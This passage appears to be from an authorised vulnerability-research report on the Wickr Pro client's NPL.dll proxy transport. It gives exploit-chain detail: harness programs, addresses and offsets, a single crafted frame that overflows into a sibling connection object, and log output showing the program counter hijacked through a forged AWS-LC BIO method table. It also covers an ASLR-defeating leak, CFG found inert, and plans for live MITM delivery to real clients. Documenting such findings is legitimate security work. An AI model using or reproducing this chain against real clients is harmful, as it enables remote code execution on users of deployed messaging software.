find its own way to the indirect call. `scratch/w14/relaydrive.c`: real handshake → in-process SSL
clone with `rbio` → forged BIO → marker → connection object with `+0x80 = 1` (TLS arm), `+0x88 =
clone`, `+0x2e4 = socket`, `fill = 0x100`, `acc = 0` → `relay(obj)`:

```
[+] real SSL handshaked
[+] SSL clone, rbio(SSL+0x18) -> forged BIO, method->bread = 0x0000454545454540
[+] connection obj  +0x80=1 (TLS)  +0x88=clone  fill=0x100 acc=0
rip=0000454545454540   accessed=0000454545454540   (FETCH)
*** PROGRAM COUNTER = ATTACKER MARKER ***
```

**The shipped `NPL 0x18009d570`, reading a connection object whose `+0x88` was set to a clone with a
forged `rbio`, transferred the program counter to an attacker value** — through its own resume→TLS
path (`0x18009d991 jne` on `+0x80`; `0x18009dafb cmp [obj+0x2e4],0 / jle` on the socket;
`0x18009db20 mov rcx,[obj+0x88]; call SSL_read`). Every field it gated on (`+0x80`, `+0x88`,
`+0x2e4`, `+0x12f8`, `+0x12fa`) is inside F6's linear overflow.

## 7a.14 ★ WHERE THE GOAL STANDS — every mechanism executed; assembly + live delivery remain

| step | status |
|---|---|
| remote OOB write, byte-exact, no precondition | **EXECUTED** |
| overflow sets arbitrary sibling offsets (linear recv) incl. `+0x80/+0x88/+0x2e4/+0x12f8` | **EXECUTED** (leakproof set `+0x1d0`/`+0x250`/`+0x12f8`/`+0x12fa` exactly; same mechanism, same reach) |
| info leak → heap pointers (ASLR defeat), and reads the victim's SSL/CS bytes for reuse | **EXECUTED** (leak); CS-reuse **INFERRED** |
| shipped relay reads corrupted `+0x88` → `SSL_read` → `BIO_read` → **PC = attacker value** | **EXECUTED on shipped code** (§7a.13) |
| CFG inert | **MEASURED** (F4b) |

**Two items remain, and they are assembly + delivery, not missing capability:**

1. **One combined frame.** `relaydrive` sets the connection fields directly and `leakproof` set them
   *via the overflow*; combining them into a single frame must also **preserve the `CRITICAL_SECTION`
   at `+0x58`** (write offset 0x880) that the TLS arm enters at `0x18009daf2` — the overflow crosses
   it. This is the same "preserve the fields the write crosses" constraint W5 handled for F1, and the
   **leak solves it** (read the real CS bytes, rewrite them in the frame). Not yet assembled.
2. **Live delivery** (operator-approved): F6's attacker terminates the TLS side of the proxy, so
   delivery is a MITM of that connection from operator infrastructure — a build, not a peer patch.

## 7a.15 ★★★★ ONE FRAME → PC, ASSEMBLED. EXECUTED end-to-end in a harness on shipped code.

The single-frame payload (item 1 of §7a.14, including the `CRITICAL_SECTION` leak-and-reuse) is built
and executed. `scratch/w14/oneframe.c`: a real SSL is handshaked and cloned (rbio → forged BIO →
marker); obj0 and obj1 are contiguous; **one crafted frame** is delivered to obj0 over a loopback TCP
pair; `relay(obj0)` performs the F6 overflow; `relay(obj1)` is the next receive-path run:

```
one frame: declared 0x1b24, sets obj1 +0x80/+0x88/+0x2e4/+0x12f8 and restores the CRITICAL_SECTION
relay(obj0): the overflow (recv into obj0, linear -> writes obj1)
    post-overflow obj1: +0x80=1  +0x88=0000021832290000 (the clone)  fill=0x100  acc=0x0
relay(obj1): next receive-path run on the corrupted sibling -> SSL_read...
rip=0000464646464640   accessed=0000464646464640   (FETCH)
*** ONE FRAME -> PROGRAM COUNTER = ATTACKER MARKER ***
```

**One crafted frame drove the program counter to an attacker-chosen value, entirely through shipped
code** — F6's overflow (`NPL 0x18009d570` recv path) set obj1's `SSL*` and TLS-arm fields, and the
relay's next run drove `SSL_read`→`BIO_read`→`method->bread`. The overflow set `+0x88` to the clone
(dump confirms), preserved obj1's `CRITICAL_SECTION` by rewriting its bytes (the leak-and-reuse a real
attacker performs with the F6 leak), and set the fill/acc/arm fields — all from the one frame.

## 7a.16 WHERE THE GOAL STANDS — a working exploit in a harness; live delivery is the remaining step

**Every link of the exploit is now executed end-to-end in one harness flow, against the shipped
`NPL.dll` / `ssl.dll` / `crypto.dll`, with a real SSL and CFG inert.** The chain: one F6 frame →
linear heap overflow with content control → sibling connection object's `SSL*` (+0x88) and TLS-arm
fields set → shipped relay handler's next run → `SSL_read` → AWS-LC `BIO_read` →
`bio->method->bread` → attacker-controlled program counter.

**The gap between this and a demonstrated over-the-wire RCE is exactly two operational things, both of
which reduce to the operator-approved MITM build — no missing capability:**

1. **Live addresses instead of harness-local ones.** The harness places obj0/obj1 contiguous and the
   clone/BIO at known local addresses. Live, the two connection objects *are* contiguous (MEASURED,
   §6.2c-quater), and the leak (EXECUTED, §7a.3) supplies the addresses to (a) read the real SSL's
   bytes for the clone and its CS, and (b) locate the sprayed clone/BIO. Spray content = the frames
   the attacker sends. Each ingredient is executed; they have not been run against a live heap.
2. **Live delivery = the MITM.** F6's attacker terminates the TLS side of the TLS-UDP proxy, so
   delivery is a MITM of that connection from operator infrastructure, not a peer patch. Approved by
   the operator; the endpoint that speaks the proxy framing + the client redirection is a build.

> **Final claim discipline.** This is **instruction-pointer control from a single remotely-shaped frame,
> executed end-to-end against the shipped binaries in a local harness** — the strongest demonstrable
> result short of the live shot. Following this engagement's own precedent (W5's harness-qualified PC
> control for F1 was deliberately *not* called RCE), **the word "RCE" still waits on the live MITM
> delivery** onto a real client. But unlike F1 — whose harness qualifier was a *reclaiming object that
> may not exist live* — every element here is confirmed to exist live (contiguous objects measured, the
> leak executed, the relay/SSL/BIO code is what runs on every call). **What remains is a delivery
> build, not an open exploitability question.** The honest headline: *a remotely-deliverable heap
> overflow yielding attacker control of the instruction pointer through the AWS-LC BIO method table,
> with an executed ASLR-defeating leak and CFG inert; demonstrated end-to-end in a harness, pending
> only live MITM delivery.*

## 7a.7 ★ THE `SSL*` ROUTE DOES NOT DEEPEN BY ITSELF — a measured negative

`leakproof.exe --deep` maps the planted `SSL*` as a real page and fills it entirely with pointers to a
second guard page, so that *any* pointer `SSL_read` follows out of the forged structure faults
visibly, and any instruction fetch from one of our values faults at that value.

```
obj1 SSL* := 000001B7E19C0000  (mapped, every qword = a second guard page)
relay(obj1)  ->  RETURNED WITHOUT FAULTING
```

**Neither a second-level dereference nor an instruction fetch occurred.** The callee is
`ssl.dll!SSL_read` (`0x18010e70f` is its IAT thunk — `jmp qword ptr [rip+0x31697b]` → IAT
`0x180425090`), and with a structurally invalid `SSL` it reads field `+0x98`, fails whatever check
that feeds, and returns cleanly.

> **⇒ Instruction-pointer control does not fall out of the pointer swap.** It requires a
> *structurally valid* forged `SSL` object — the field at `+0x98` and whatever state it gates must be
> consistent enough for `SSL_read` to proceed to a method-table call. That is **bounded engineering
> against a known library layout, not a search** — which is a materially different position from the
> previous fourteen waves — but it is **work that has not been done, and nothing here should be read
> as saying IP control is close.** The one enabler worth recording: **CFG is inert process-wide**
> (F4b — `WickrPro.exe` never opts in, `DllCharacteristics 0x8160`), so an indirect call through a
> forged table would not be blocked by CFG if one were reached.

## 7a.6 Qualifiers that travel with this result

* **The objects in §7a.3 are harness-constructed.** Every displacement used was confirmed against two
  objects dumped from a running client (§6.2c-quater), including the contiguity `obj0+0x1320 == obj1`
  and the `SSL*` at `+0x88` — but the chain itself has **not** been run against a live client, and no
  crafted frame has ever been sent to one.
* **The attacker position is unchanged: whoever terminates the TLS side of the TLS-UDP proxy — the
  media hub.** `+0x80` read 1 (TLS arm) on both live objects; the plain-TCP arm was never observed,
  so "any on-path attacker" is still **not** supported.
* **Reachability is gated on the TCP transport being in use** (§6.10) — a one-click user setting, and
  server-side `forceTcpCall`. With UDP winning, the relay handler ran zero times.
* The heap markers in §7a.3 are planted by the harness. §7a.4's claim about real `SSL*` pointers is
  **arithmetic on measured live addresses**, not a live capture of leaked bytes.

# 8a. ROUTE A — standing the real connection objects up locally, without WickrPro and without a call

**Why this route exists.** The proxy connection objects are created at call setup (the logs put them
~2 s before media), so an idle `WickrPro.exe` has none, and creating them needs a call — which the RoE
forbids outright, independently of any launch agreement. But `NPL.dll` exports the whole transport API,
and **`WickrPro.exe` imports exactly the subset needed** (96 NPL imports; the relevant ones below), so
the objects can be built by their real constructors in our own process against a local TLS listener.

**The recipe, read out of WickrPro's own call sites.** The port setup is one function,
`WickrPro 0x1406ec120` (2,110 bytes): create → set queue → seven properties.

| step | export | call site | notes |
|---|---|---|---|
| 1 | `NPLInitialize` | `0x14012d2a2`, `0x14012d37e` | in `0x14012cd50` |
| 2 | `NPLSetServerCertificates` | `0x14014233a`, `0x140142605` | PEM; a self-signed CA works |
| 3 | `NPLPortCreate` | `0x1406ec158` | `xor ecx, ecx` @ `0x1406ec156` ⇒ **port 0**, matching the log `Opening IPv4 port 0` |
| 4 | `NPLPortSetQueue` | `0x1406ec22c` | |
| 5 | `NPLPortSetProperty` ×7 | `0x1406ec2a2` … `0x1406ec8aa` | see keys below |
| 6 | `NPLPortConnectDual` | `0x14070bb08` | in `0x14070b700` |

**`NPLPortSetProperty(port, const char *key, const void *value, uint32_t len)` — CONFIRMED**, from the
int-valued sites: `mov r9d, 4` / `lea r8, [rbp-0x61]` / `lea rdx, [rip+…]` / `mov rcx, [rsi+8]`
(`0x1406ec6ca`–`0x1406ec6df`). String values pass the SSO-resolved data pointer and the length
(`cmp qword [rbp+0x17], 0xf / cmova r8, …` @ `0x1406ec6ab`).

**The seven keys, and the one that matters:**

```
fallbackPort   fallbackProtocol   fallbackProxyPort   useFallbackOnly
ingress        eventId            socks_udp           peerConnectionTimeout (= 0x3a98 = 15000 ms)
```

`useFallbackOnly` is set with its own log line **`"[VV PN] NPLPortSetProperty: useFallbackOnly: 1"`**
(`0x14320a558`). ⇒ **setting `useFallbackOnly = 1` forces the TLS-UDP proxy transport**, which is
exactly what brings `0x18009d570` up deterministically with no call.

`fallbackProtocol` takes a string. The values present as literals are **`"tls"`** (`0x14320a508`, with
its own log line `"…fallbackProtocol: tls"` at `0x14320a511`), **`"socks"`** (`0x14320a45c`) and
**`"socks_udp"`** (`0x14320a468`); one set site passes a caller-supplied string instead.

**What this buys, in one run:** hook `0x18009d570`'s entry passively and log `rcx` — the count of
distinct values is the slot occupancy (§6.2d's open question), and each value is a **real** connection
object built by the real constructor, which removes §6.2c's harness qualifier. Then have the local
listener send the crafted frame.

### Stage 1 — EXECUTED. The real NPL transport stack stands up locally

`scratch/w14/portprobe.c`, run against the shipped `NPL.dll`, no `WickrPro.exe`, no call:

```
[+] NPLGetAPIVersion()                       -> 3
[+] NPLInitialize(&{ver=3, n=0, one=1})      -> 0
[+] NPLSetCommandLineParam("ingress","")     -> 0
[+] NPLSetCommandLineParam("eventId","0")    -> 0
[+] NPLPortCreate(0,0,0,0)                   -> 0x000000ECBF6809C0    <-- a real port
[+] NPLPortSetProperty useFallbackOnly=1     -> 0
[+] NPLPortSetProperty fallbackProtocol=tls  -> 0
[+] NPLPortSetProperty fallbackPort          -> 5   (rejected; wrong value type/width)
[+] NPLPortSetProperty peerConnectionTimeout -> 0
```

**Two API facts settled by execution, both of which cost a fault to learn:**

* **`NPLInitialize` takes a STRUCT POINTER, not an int.** The export is a 3-instruction thunk
  (`mov rdx, rcx / lea rcx,[rip+0x3bbfbe] / jmp 0x1800699b0`), so the caller's argument lands in the
  *second* parameter and is dereferenced. Passing the version by value AVs at `NPL+0x699dc` reading
  address `0x3`. The layout, reconstructed from `WickrPro 0x14012cd50` and confirmed by a return of 0:
  `+0x00` qword = API version (3), `+0x08` qword, `+0x10` dword = param count, `+0x14` dword,
  `+0x18` qword = param array, `+0x20` dword = 1. Zeroes work for everything but the version.
* **The port path needs the NPL command line seeded first.** Without it `NPLPortCreate` prints
  `CommandLine::InitializeWithArgv was not called` and faults; two `NPLSetCommandLineParam` calls fix
  it. `NPLSetCommandLineParam(const char *key, const char *value)` — `rcx` null-checked, returns 5.

⇒ **`useFallbackOnly = 1` and `fallbackProtocol = "tls"` are both accepted on a real port object.**
That is the configuration that selects the transport carrying F6, set without a call.

### Stage 2 — the local TLS endpoint stands up; `NPLPortConnectDual` still bails. NOT SOLVED

`scratch/w14/tlslisten.py` (a Python TLS server on 127.0.0.1 with a self-signed cert in
`scratch/w14/tls/`) plus the extended `portprobe.c`:

```
[+] NPLPortCreate(0,0,0,0)                    -> 0x0000008679D12AB0
[+] NPLNetQueueCreate()                       -> 0x0000008679D41C20
[+] NPLPortSetQueue(port, q)                  -> 0
[+] NPLPortSetProperty useFallbackOnly=1      -> 0
[+] NPLPortSetProperty fallbackProtocol="tls" -> 0
[+] NPLSetServerCertificates(&pem, 1)         -> 0
[+] NPLPortConnectDual(port,"udp://127.0.0.1:15500","tls://127.0.0.1:15501",ctx,0x2710) -> 2
```

**The listener never sees a TCP accept**, so `ConnectDual` bails before attempting anything. Two more
API facts were settled on the way, both by faulting:

* **`NPLSetServerCertificates(const char **pems, int count)`** — an *array* of PEMs, not one string.
  It does `mov rcx, qword ptr [rsi]` @ `0x1803cdd70` and then strlens `rcx`, so passing a `char*`
  dereferences the PEM text as a pointer and AVs at `0x1803cdd83` reading `0xFFFFFFFFFFFFFFFF`.
  With `(&pem, 1)` it returns 0.
* **`NPLPortSetQueue` needs a queue from `NPLNetQueueCreate()`**; both return cleanly.

**Where the 2 comes from — SETTLED by instrumentation, not by reading.** `NPLPortConnectDual` has
exactly two `mov eax, 2` sites (`0x1803cc38d`, `0x1803cc46c`). Arming INT3 at both, plus at the entry,
the `ensureFips` block, the body, and `NPL_SetError` (`0x18006b5e0`, which every NPL error return goes
through — `movsxd rbx,ecx` / TLS store / `mov eax,ebx`), gave:

```
[probe] NPLPortConnectDual entry            rcx=...d3b0
[probe] reached the ensureFips block        rcx=...d3b0
[probe] reached the BODY (past the gate)    rcx=...3f80  rbx=1  rax=1
[probe] inner call takes arg4 (0x1803cc856) rcx=...f738
[probe] NPL_SetError(5)  <- caller NPL+0x3cc87f
NPLPortConnectDual -> 2
```

**Neither `mov eax, 2` site executes.** The body is reached and the 2 is manufactured from a failed
*inner virtual* connect:

```
0x1803cc861  ff9658010000  call qword ptr [rsi + 0x158]   ; the port impl's connect
0x1803cc867  85c0          test eax, eax
0x1803cc869  741d          je   0x1803cc888               ; 0 -> success
0x1803cc86b  83f801        cmp  eax, 1
0x1803cc86e  7411          je   0x1803cc881               ; 1 -> pending
0x1803cc870  b905000000    mov  ecx, 5                    ; anything else:
0x1803cc875  bb02000000    mov  ebx, 2                    ;   SetError(5), return 2
0x1803cc87a  e861edc9ff    call 0x18006b5e0
```

⇒ **`[rsi+0x158]` returned neither 0 nor 1.** NPL error 5 is "invalid argument" (the same code
`NPLPortSetProperty` returns for `fallbackPort`, and `NPLSetCommandLineParam`'s null check), so the
most likely cause is the address-string format — the two arguments were passed as
`"udp://127.0.0.1:15500"` / `"tls://127.0.0.1:15501"`, and the `udp://` / `tls://` prefixes may be
composed by the logger (`0x18008a240`) rather than expected on input.

**Next step, one level deeper:** probe `[rsi+0x158]` itself and read its argument validation. This is
now a debugging loop inside NPL's port implementation, one build/run cycle per hypothesis.

*(The `ensureFips` block at `0x1803cc397`–`0x1803cc42e` is a genuine feature check —
`NPL 0x180426e78` holds the 10-byte key `"ensureFips"` — but it is **not** what is failing here, and
setting the parameter via `NPLSetCommandLineParam("ensureFips","false")` changed nothing.)*

**Also still open:** `fallbackPort` is rejected with 5 (wrong value width), and `NPLPortConnectDual`'s
4th argument is only known to be forwarded opaquely (`r13` → `[rsp+0x20]` at `0x1803cc856`); at the
WickrPro call site it is `this + 8` (`mov r14, rcx` @ `0x14070b729`).

**Risk, stated up front:** the proxy may require a handshake our listener would have to speak. If so,
the fallback is to drive `0x18009bfc7` (the 8-slot poller) directly.

> **★ `fn.py`'s extent bug bit a third time.** It reports `NPLPortConnectDual` as **470 bytes**
> (`0x1803cc2a0`–`0x1803cc476`); the real extent is **`0x1803cc2a0`–`0x1803cca13`, 1,907 bytes** in two
> chunks, and *the entire body is in the second chunk* — the first is only the licence/init gate. Use
> `lin.py`.

## 8b. The plain-TCP arm — partial answer, and it is the attacker-position question

`[obj+0x80]` selects the arm: `0` → plain `recv` (`0x18009d991 jne` falls through), non-zero → the
`SSL_read` wrapper. It has exactly three writers in the Net range:

```
0x18009b31c  mov byte ptr [rdi + 0x80], 0     ; the RESET routine 0x18009b2e0 -- same rdi that it
                                              ; also uses for [rdi+0xaf4] and [rdi+0x12f8], so this
                                              ; is our object, and reset leaves it on the PLAIN arm
0x1800a012e  mov byte ptr [rbx + 0x80], dl    ; the constructor 0x18009ffc0 -- taken as an ARGUMENT
0x1800ac90d  mov byte ptr [rbp + 0x80], bl    ; a different class
```

⇒ **the plain-TCP arm is not dead code: it is the post-reset default, and the constructor takes the
flag as a parameter.** **UNDETERMINED:** whether any shipped configuration actually runs it —
`fallbackProtocol ∈ {tls, socks, socks_udp}` and the ctor argument both feed it. Both arms carry the
identical defect, so this changes only the attacker position, not F6's existence.

**Independently worth reporting:** **`forceTcpCall` is a key in the server-supplied network-settings
block** (`WickrPro 0x143255760`, and again at `0x14326a765`), sitting in the CALLING group beside
`canStartCall` / `canVideoCall` / `canStartScreenShare` and two entries away from `forceOpenAccess` and
`censorshipProxyConfig` — the block W9 established is server-flippable. **INFERRED (not traced to its
consumer): the network operator can force calls onto the TCP transport that carries F6.**

# 9. What a next session should pick up, in order

1. **DONE this wave — see §6.2a/§6.2b.** The destination is the victim's own media socket, so F6 is a
   write primitive, not a direct leak; but the write lands on **7 contiguous sibling connection
   objects**, each with an `SSL*`, two socket handles and its own `sendto` destination at fixed
   offsets. **The next question is whether more than one of the eight connections is active at a time**
   — that decides whether redirecting a sibling's `sendto` produces traffic.
2. **Build the §6 PoC against a local harness** — a 2-byte prefix of `0x0804` followed by 0x804 bytes,
   the last four chosen. Do not fuzz Wickr servers; stand up a local TLS endpoint and point one
   operator client at it, or drive `0x18009d570` directly by address as `harness_vp8.py` does for libvpx.
3. **Price the plain-TCP arm** (`byte [obj+0x80] == 0`). If reachable without TLS the attacker position
   drops from "the hub" to "any on-path attacker" and §6 becomes the most severe finding in the
   engagement.
4. **Close the `SSL_write`/`BIO_write` blind spot** (§8) — that is the remaining half of the egress
   census and the only place a media-layer echo could still hide.
5. Only then: the `[obj+0x1d0]`-independent question of whether the §6 overflow can be steered — it
   lands in a live heap adjacent to a ~0x1320-byte object with attacker-controlled content, which is a
   materially better starting point than link (a) ever had.
